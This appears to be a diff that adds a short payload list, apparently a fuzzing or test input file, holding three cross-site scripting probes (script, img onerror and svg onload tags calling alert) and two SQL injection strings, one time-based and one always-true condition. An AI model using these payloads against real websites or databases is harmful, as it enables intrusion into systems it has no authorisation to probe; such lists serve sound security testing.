@@ -1,0 +1,5 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+;WAITFOR DELAY '00:00:05'--
+' OR '1'='1
